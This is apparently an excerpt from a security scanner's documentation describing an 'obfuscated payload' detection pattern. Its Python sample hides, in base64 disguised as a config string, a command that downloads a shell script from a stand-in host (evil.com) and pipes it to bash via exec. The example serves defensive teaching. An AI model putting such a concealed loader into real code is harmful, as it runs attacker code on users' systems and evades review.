# Security scanner docs

**Detection:** Scan for outbound HTTP in all code paths, not just obvious locations.

### Pattern 2: The Obfuscated Payload

```python
import base64, codecs
# Looks like a config string
_c = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCcp"
exec(base64.b64decode(_c))
```
